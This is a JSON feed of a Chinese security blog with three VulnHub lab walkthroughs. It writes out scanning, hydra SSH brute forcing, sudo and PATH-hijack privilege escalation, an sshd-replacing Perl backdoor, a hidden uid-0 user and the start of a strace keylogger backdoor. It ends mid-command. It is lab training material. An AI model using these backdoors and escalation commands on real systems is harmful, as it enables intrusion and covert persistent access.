{
    "version": "https://jsonfeed.org/version/1",
    "title": "X_T • All posts by \"vulnhub 11-20\" tag",
    "description": "人生如逆旅，我亦是行人",
    "home_page_url": "https://n1h1l157.github.io",
    "items": [
        {
            "id": "https://n1h1l157.github.io/2021/11/01/VULNHUB/112%20THOTH/",
            "url": "https://n1h1l157.github.io/2021/11/01/VULNHUB/112%20THOTH/",
            "title": "VULNHUB 12 THOTH",
            "date_published": "2021-10-31T16:00:00.000Z",
            "content_html": "<p>靶机下载地址：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvdGhvdGgtdGVjaC0xLDczNC8=\">https://www.vulnhub.com/entry/thoth-tech-1,734/</span><br>\n 教程链接地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM5OTkxODM3L2FydGljbGUvZGV0YWlscy8xMTk5NDQ5Mzc=\">https://blog.csdn.net/qq_39991837/article/details/119944937</span></p>\n<h3 id=\"确认攻击目标\"><a class=\"markdownIt-Anchor\" href=\"#确认攻击目标\">#</a> 确认攻击目标</h3>\n<p>攻击机 KALI： 192.168.31.135<br>\n 靶机 THOTH：桥接于 192.168.31.1 的网卡，ip 未知</p>\n<p>1）arp 确定靶机地址<br>\n <code>sudo arp-scan -l</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-253.png\" width=\"520\" alt=\"Image\">\n<p>-&gt; 目标机器的 ip 地址： 192.168.31.229</p>\n<ol start=\"2\">\n<li>确认靶机 ip 开放的端口信息<br>\n <code>sudo nmap -A -p- 192.168.31.229 -oN /tmp/thoth.txt</code></li>\n</ol>\n<img data-src=\"/N1h1l157/VULNHUB/image-254.png\" width=\"450\" alt=\"Image\">\n<p>-&gt; 靶机开放端口 21, 22, 80</p>\n<h3 id=\"ftp-匿名登陆\"><a class=\"markdownIt-Anchor\" href=\"#ftp-匿名登陆\">#</a> FTP 匿名登陆</h3>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">利用用户ftp和空密码登陆到ftp查看有没有敏感文件</span></span><br><span class=\"line\">ftp 192.168.31.229</span><br><span class=\"line\">dir &amp;&amp; get note.txt</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-255.png\" alt></p>\n<p>-&gt; 得到提示是 pwnlab 是该服务器的某一个用户，并且密码比较简单</p>\n<h3 id=\"目录扫描\"><a class=\"markdownIt-Anchor\" href=\"#目录扫描\">#</a> 目录扫描</h3>\n<p>80 网站信息收集，是个默认的 apache 界面</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-256.png\" alt></p>\n<p><code>dirsearch -u http://192.168.31.229</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-257.png\" width=\"520\" alt=\"Image\">\n<p><code>gobuster dir -u http://192.168.31.229/ -x php,txt,html,zip,rar -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-253.png\" width=\"570\" alt=\"Image\">\n<p>-&gt; gobuster 扫描后并没有什么发现</p>\n<h3 id=\"hydra-爆破-ssh\"><a class=\"markdownIt-Anchor\" href=\"#hydra-爆破-ssh\">#</a> hydra 爆破 SSH</h3>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">hydra 爆破可疑用户 pwdlab 的密码登陆ssh</span></span><br><span class=\"line\">hydra -l pwnlab -P /usr/share/wordlists/rockyou.txt ssh://192.168.31.229 -f -t 4 -vV -o hydra.ssh</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-259.png\" alt></p>\n<p>-&gt; 账户：pwnlab 密码：babygirl1</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">登陆服务器</span></span><br><span class=\"line\">ssh pwnlab@192.168.31.229</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">收集服务器信息：</span></span><br><span class=\"line\">cat /etc/issue &amp;&amp; uname -a &amp;&amp; sudo -l</span><br></pre></td></tr></table></figure>\n<h3 id=\"sudofind提权\"><a class=\"markdownIt-Anchor\" href=\"#sudofind提权\">#</a> sudo (find) 提权</h3>\n<p>发现可以直接通过无密码调用 root 权限的 find<br>\n 寻找提权命令：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ndGZvYmlucy5naXRodWIuaW8vZ3Rmb2JpbnMvZmluZC8=\">https://gtfobins.github.io/gtfobins/find/</span><br>\n <code>sudo find. -exec /bin/sh \\; -quit</code></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-260.png\" alt></p>\n<p>-&gt; 直接提升成了 root 账户</p>\n<h3 id=\"ssh-wrapper维权\"><a class=\"markdownIt-Anchor\" href=\"#ssh-wrapper维权\">#</a> SSH wrapper 维权</h3>\n<p>参考地址：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ieXBhc3MwMDcuZ2l0aHViLmlvL0VtZXJnZW5jeS1SZXNwb25zZS1Ob3Rlcy9wcml2aWxlZ2Uv\">https://bypass007.github.io/Emergency-Response-Notes/privilege/</span><br>\n 从 sshd fork 出一个子进程，输入输出重定向到套接字，并对连过来的客户端端口进行了判断。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">靶机上依次执行一下命令：</span></span><br><span class=\"line\">cd /usr/sbin/</span><br><span class=\"line\">mv sshd ../bin/</span><br><span class=\"line\">echo &#x27;#!/usr/bin/perl&#x27; &gt;sshd</span><br><span class=\"line\">echo &#x27;exec &quot;/bin/sh&quot; if(getpeername(STDIN) =~ /^..4A/);&#x27; &gt;&gt;sshd</span><br><span class=\"line\">echo &#x27;exec&#123;&quot;/usr/bin/sshd&quot;&#125; &quot;/usr/sbin/sshd&quot;,@ARGV,&#x27; &gt;&gt;sshd</span><br><span class=\"line\">chmod u+x sshd</span><br><span class=\"line\">/etc/init.d/sshd restart</span><br><span class=\"line\">Service ssh restart</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-261.png\" alt></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">攻击机执行以下命令</span></span><br><span class=\"line\">socat STDIO TCP4:192.168.31.229:22,sourceport=13377</span><br><span class=\"line\">python3 -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br><span class=\"line\">stty raw -echo;</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-262.png\" alt></p>\n<p>-&gt; ssh wrapper 权限维持成功，可免密登陆 root 账户</p>\n",
            "tags": [
                "VULNHUB 11-20"
            ]
        },
        {
            "id": "https://n1h1l157.github.io/2021/11/01/VULNHUB/111%20DEATHNOTE/",
            "url": "https://n1h1l157.github.io/2021/11/01/VULNHUB/111%20DEATHNOTE/",
            "title": "VULNHUB 11 DEATHNOTE",
            "date_published": "2021-10-31T16:00:00.000Z",
            "content_html": "<p>靶机下载地址：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvZGVhdGhub3RlLTEsNzM5Lw==\">https://www.vulnhub.com/entry/deathnote-1,739/</span><br>\n 教程链接地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpb253ZXJzb24vYXJ0aWNsZS9kZXRhaWxzLzEyMTU5NDU0NQ==\">https://blog.csdn.net/lionwerson/article/details/121594545</span></p>\n<h3 id=\"确认攻击目标\"><a class=\"markdownIt-Anchor\" href=\"#确认攻击目标\">#</a> 确认攻击目标</h3>\n<p>攻击机 KALI： 192.168.31.135<br>\n 靶机 DEATHNOTE：桥接于 192.168.31.1 的网卡，ip 未知</p>\n<ol>\n<li>\n<p>通过 netdiscover 扫描当前网卡里边有哪些机器<br>\n <code>sudo netdiscover -i eth0 -r 192.168.31.0/24</code></p>\n</li>\n<li>\n<p>将所有已知的 ip 暂时存档，对这类 ip 地址不做端口扫描</p>\n</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">shell</span></span><br><span class=\"line\">cat &gt; myip.txt &lt;&lt; EOF</span><br><span class=\"line\">192.168.31.1 192.168.31.25 192.168.31.58 192.168.31.86 192.168.31.33</span><br><span class=\"line\">192.168.31.120 192.168.31.135 192.168.31.145 192.168.31.162 192.168.31.44</span><br><span class=\"line\">EOF</span><br></pre></td></tr></table></figure>\n<ol start=\"3\">\n<li>获取靶机 ip 地址</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">去除一些已知ip的机器，对剩余IP进行端口扫描，判断目标IP</span></span><br><span class=\"line\">sudo nmap -PA 192.168.31.107 --excludefile myip.txt</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">或者使用 arp 扫描</span></span><br><span class=\"line\">sudo arp -l</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-229.png\" width=\"590\" alt=\"Image\">\n<p>-&gt; 目标机器的 ip 地址： 192.168.31.212</p>\n<ol start=\"4\">\n<li>确认靶机 ip 开放的端口信息</li>\n</ol>\n<p><code>sudo nmap -A -p- 192.168.31.212 -oN /tmp/deathnote.txt</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-230.png\" width=\"480\" alt=\"Image\">\n<p>-&gt; 靶机开放端口 22, 80</p>\n<h3 id=\"wpscan-扫描-wordpress\"><a class=\"markdownIt-Anchor\" href=\"#wpscan-扫描-wordpress\">#</a> wpscan 扫描 wordpress</h3>\n<p>打开 <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMjEyLw==\">http://192.168.31.212/</span> 进行信息收集<br>\n网页发生跳转，可直接修改本地 hosts 文件，改变 dns 解析<br>\n /etc/hosts 中添加 192.168.31.212 deathnote.vuln</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-231.png\" alt></p>\n<p>网站是一个 wordpress 网站，可直接利用 wpscan 扫描</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">通过wpscan对网站的用户名进行枚举</span></span><br><span class=\"line\">wpscan --url http://192.168.31.212/wordpress/ --enumerate u --api-token eG5iT4ooiuP7eVJVedsHhlgx8xeZHmAJjBr13asnjEc</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-232.png\" width=\"550\" alt=\"Image\">\n<p>-&gt; 得到网站的用户名有 kira</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">根据用户名kira继续扫描密码看是否能扫到</span></span><br><span class=\"line\">wpscan --url http://192.168.31.212/wordpress/ -U kira -P /usr/share/wordlists/rockyou.txt --api-token eG5iT4ooiuP7eVJVedsHhlgx8xeZHmAJjBr13asnjEc</span><br></pre></td></tr></table></figure>\n<p>-&gt; 没有扫到用户 kira 的密码</p>\n<p>翻阅网站可点击的地方，找到一处提示</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-233.png\" alt></p>\n<p>根据提示，访问 http://192.168.31.212/notes.txt</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-234.png\" width=\"420\" alt=\"Image\">\n<p>没有找到这个提示文件</p>\n<p>顺便访问一下爬虫协议的文件：<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMjEyL3JvYm90cy50eHQ=\">http://192.168.31.212/robots.txt</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-235.png\" width=\"450\" alt=\"Image\">\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">根据提示下载 jpg</span></span><br><span class=\"line\">wget http://192.168.31.212/important.jpg</span><br><span class=\"line\">cat important.jpg</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-236.png\" width=\"520\" alt=\"Image\">\n<p>新的提示，网站密码应该在网站的页面上</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-237.png\" alt></p>\n<p>-&gt; 发现疑似密码的字符串 iamjustic3</p>\n<h3 id=\"wordpress-后台突破\"><a class=\"markdownIt-Anchor\" href=\"#wordpress-后台突破\">#</a> wordpress 后台突破</h3>\n<p>可以使用 msf 直接 getshell，或者在后台寻找突破反弹 shell<br>\nwordpress 的后台 wp-login：<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMjEyL3dvcmRwcmVzcy93cC1sb2dpbi5waHA=\">http://192.168.31.212/wordpress/wp-login.php</span><br>\n 用户名 kira 密码 iamjustic3</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-238.png\" alt></p>\n<p>翻阅后台文件，找到了 notes.txt</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-239.png\" alt></p>\n<p>点击进入到 notes.txt 可以找到这个文件的 url 地址</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-240.png\" alt></p>\n<p>下载到本地，查看此文件查询更多详细的信息</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wget http://deathnote.vuln/wordpress/wp-content/uploads/2021/07/notes.txt</span><br><span class=\"line\">cat notes.txt</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-241.png\" alt></p>\n<h3 id=\"hydra-爆破-ssh\"><a class=\"markdownIt-Anchor\" href=\"#hydra-爆破-ssh\">#</a> hydra 爆破 SSH</h3>\n<p>发现是一个密码文件，尝试用 hydra 进行爆破 ssh 登陆</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hydra -l kira - P notes.txt ssh://192.168.31. 212 - f -t 4 -I -vV -o hydra.ssh</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-242.png\" alt></p>\n<p>-&gt; 爆破失败，无法用用户 kira 登陆到此服务器</p>\n<p>前面得到一个线索 user.txt 中可能藏着一些敏感的用户<br>\n此时我们已经拿到了后台的权限，可以访问<br>\n<span class=\"exturl\" data-url=\"aHR0cDovL2RlYXRobm90ZS52dWxuL3dvcmRwcmVzcy93cC1jb250ZW50L3VwbG9hZHMvMjAyMS8wNy9ub3Rlcy50eHQ=\"> http://deathnote.vuln/wordpress/wp-content/uploads/2021/07/notes.txt</span><br>\n 获取到目标机器密码的列表，我们可以尝试访问<br>\n<span class=\"exturl\" data-url=\"aHR0cDovL2RlYXRobm90ZS52dWxuL3dvcmRwcmVzcy93cC1jb250ZW50L3VwbG9hZHMvMjAyMS8wNy91c2VyLnR4dA==\"> http://deathnote.vuln/wordpress/wp-content/uploads/2021/07/user.txt</span><br>\n<img data-src=\"/N1h1l157/VULNHUB/image-243.png\" alt></p>\n<p>找到了敏感的 user.txt 文件，可以用做 hydra 的爆破用户名的字典，可以将疑似网站用户的昵称提前，如在网站上看到的 kira，l<br>\n 如果用户名刚好是这些，可以很快的提高爆破速度</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wget http://deathnote.vuln/wordpress/wp-content/uploads/2021/07/user.txt</span><br><span class=\"line\">hydra -L user.txt -P notes.txt ssh://192.168.31. 212 -f -t 4 -I -vV -o hydra.ssh</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-244.png\" alt></p>\n<p>-&gt; 用户名 l 密码 death4me</p>\n<h3 id=\"cyberchef-解密\"><a class=\"markdownIt-Anchor\" href=\"#cyberchef-解密\">#</a> CyberChef 解密</h3>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">登陆到目标服务器</span> </span><br><span class=\"line\">ssh l@192.168.31.212</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">收集服务器的相关信息</span></span><br><span class=\"line\">cat /etc/issue &amp;&amp; uname -a &amp;&amp; sudo -l</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-245.png\" alt></p>\n<p>-&gt; 用户 l 在目标机器上没有 sudo 权限</p>\n<p>翻阅目录，找到了下面这个加密文件</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-246.png\" alt></p>\n<p>这是 brainfuck 加密，在线解密 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYuYnVna3UuY29tL3Rvb2wvYnJhaW5mdWNr\">https://ctf.bugku.com/tool/brainfuck</span></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-247.png\" alt></p>\n<p>得到提示，我们需要进入到 kira 用户里边，再次在目标服务器里边进行搜索，找到一个敏感目录 /opt/L</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-248.png\" width=\"570\" alt=\"Image\">\n<p>在线解密 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9nY2hxLmdpdGh1Yi5pby9DeWJlckNoZWYv\">https://gchq.github.io/CyberChef/</span></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-249.png\" alt></p>\n<p>-&gt; 通过 magic 方法可破解得到密码 kiraisevil</p>\n<p><code>su kira</code>  切换到 kira 账户，sudo -l 查看相关权限设置<br>\n发现该账户可以执行所有的 root 命令，直接 sudo su 切换到 root 账户</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-250.png\" width=\"520\" alt=\"Image\">\n<h3 id=\"创建特权用户维权\"><a class=\"markdownIt-Anchor\" href=\"#创建特权用户维权\">#</a> 创建特权用户维权</h3>\n<p>权限维持参考地址：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ieXBhc3MwMDcuZ2l0aHViLmlvL0VtZXJnZW5jeS1SZXNwb25zZS1Ob3Rlcy9wcml2aWxlZ2Uv\">https://bypass007.github.io/Emergency-Response-Notes/privilege/</span></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">创建一个用户名X_T，密码 123456 的普通用户</span></span><br><span class=\"line\">useradd -p `openssl passwd - 1 - salt &#x27;salt&#x27; 123456` X_T</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">创建一个用户名kali，密码kali的root用户</span></span><br><span class=\"line\">useradd -p `openssl passwd - 1 - salt &#x27;salt&#x27; kali` kali -o -u 0 -g root -G root -s /bin/bash -d /home/test</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">尝试连接</span></span><br><span class=\"line\">ssh X_T@192.168.31.212</span><br><span class=\"line\">su kali</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-251.png\" alt></p>\n<p>-&gt; 每次都可以通过先登陆到 X_T 用户，再通过 su kali 切换到 root 账户</p>\n<h3 id=\"可疑用户排查技巧\"><a class=\"markdownIt-Anchor\" href=\"#可疑用户排查技巧\">#</a> 可疑用户排查技巧</h3>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">查询特权用户特权用户(uid 为 0 )</span></span><br><span class=\"line\">awk -F: &#x27;$3==0&#123;print $1&#125;&#x27; /etc/passwd</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">查询可以远程登录的帐号信息</span></span><br><span class=\"line\">awk &#x27;/\\$1|\\$6/&#123;print $1&#125;&#x27; /etc/shadow</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">除root帐号外，其他帐号是否存在sudo权限。如没有必要，普通帐号应删除sudo权限</span></span><br><span class=\"line\">more /etc/sudoers | grep -v &quot;^#\\|^$&quot; | grep &quot;ALL=(ALL)&quot;</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-252.png\" alt></p>\n<p>-&gt; 靶机攻击结束</p>\n",
            "tags": [
                "VULNHUB 11-20"
            ]
        },
        {
            "id": "https://n1h1l157.github.io/2021/11/01/VULNHUB/114%20ICA/",
            "url": "https://n1h1l157.github.io/2021/11/01/VULNHUB/114%20ICA/",
            "title": "VULNHUB 14 ICA",
            "date_published": "2021-10-31T16:00:00.000Z",
            "content_html": "<p>靶机下载地址：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvaWNhLTEsNzQ4Lw==\">https://www.vulnhub.com/entry/ica-1,748/</span><br>\n 教程链接地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDgzMDY0NS9hcnRpY2xlL2RldGFpbHMvMTIzNTIwMTE4\">https://blog.csdn.net/weixin_44830645/article/details/123520118</span></p>\n<h3 id=\"确认攻击目标\"><a class=\"markdownIt-Anchor\" href=\"#确认攻击目标\">#</a> 确认攻击目标</h3>\n<p>攻击机 KALI： 192.168.31.135<br>\n 靶机 ICA：桥接于 192.168.31.1 的网卡，ip 未知</p>\n<p>1）arp 确定靶机地址<br>\n <code>sudo arp-scan -l</code></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-290.png\" alt></p>\n<p>-&gt; 目标机器的 ip 地址： 192.168.31.50</p>\n<ol start=\"2\">\n<li>确认靶机 ip 开放的端口信息<br>\n <code>sudo nmap -A -p- 192.168.31.50 -oN /tmp/ica.txt</code></li>\n</ol>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-291.png\" alt></p>\n<p>-&gt; 靶机开放端口 21, 80, 8080</p>\n<h3 id=\"qdpm92-漏洞寻找\"><a class=\"markdownIt-Anchor\" href=\"#qdpm92-漏洞寻找\">#</a> qdpm9.2 漏洞寻找</h3>\n<p>1 ）打开网址 <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuNTA=\">http://192.168.31.50</span></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-292.png\" alt></p>\n<p>发现版本号 qdpm9.2 直接搜索 exp</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-293.png\" alt></p>\n<p>在 exploit-db 上找到了可以利用的 poc</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-294.png\" alt></p>\n<p>访问网址：<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuNTAvY29yZS9jb25maWcvZGF0YWJhc2VzLnltbA==\">http://192.168.31.50/core/config/databases.yml</span></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-295.png\" alt></p>\n<p>-&gt; 得到数据库用户名：qdpmadmin 密码：UcVQCMQk2STVeS6J</p>\n<h3 id=\"mysql-寻找敏感信息\"><a class=\"markdownIt-Anchor\" href=\"#mysql-寻找敏感信息\">#</a> mysql 寻找敏感信息</h3>\n<p><code>mysql -h 192.168.31.50 -u qdpmadmin - p</code></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-296.png\" alt></p>\n<p>可以用 Navicat 进入数据库</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-297.png\" alt></p>\n<p>也可以登陆到服务器之后对这些表进行查看</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-298.png\" alt></p>\n<p>-&gt; 找到一些 base64 加密后的密码以及一些用户名</p>\n<h3 id=\"hydra-爆破密码\"><a class=\"markdownIt-Anchor\" href=\"#hydra-爆破密码\">#</a> hydra 爆破密码</h3>\n<p>将用户名和解密后的密码加载到本地</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-299.png\" alt></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">用hydra破解:</span></span><br><span class=\"line\">hydra -L user.txt -P pass.txt ssh://192.168.31.50</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-300.png\" alt></p>\n<h3 id=\"服务器信息收集\"><a class=\"markdownIt-Anchor\" href=\"#服务器信息收集\">#</a> 服务器信息收集</h3>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-301.png\" alt></p>\n<p>寻找是否有可利用的 s 权限的文件</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-302.png\" alt></p>\n<h3 id=\"篡改环境变量提权\"><a class=\"markdownIt-Anchor\" href=\"#篡改环境变量提权\">#</a> 篡改环境变量提权</h3>\n<p>strings 命令用于查看二进制文件中可打印的字符</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-303.png\" alt></p>\n<p>发现 /opt/get_access 会执行 cat 命令<br>\n因此可以伪造 cat 命令，修改环境变量，使 get_access 执行一个伪造的 cat</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">export PATH=/tmp:$PATH</span><br><span class=\"line\">echo ‘/bin/bash’ &gt; /tmp/cat</span><br><span class=\"line\">Chmod +x /tmp/cat</span><br><span class=\"line\">/opt/get_access</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-304.png\" alt></p>\n<h3 id=\"strace-后门\"><a class=\"markdownIt-Anchor\" href=\"#strace-后门\">#</a> strace 后门</h3>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">查看是否存在其他的strace监控键盘记录，有的话通过<span class=\"built_in\">kill</span> - 9 <span class=\"built_in\">id</span>删掉</span></span><br><span class=\"line\">alias | grep ssh &amp;&amp; ps -ef | grep strace</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">修改环境变量</span></span><br><span class=\"line\">cat &gt;&gt; 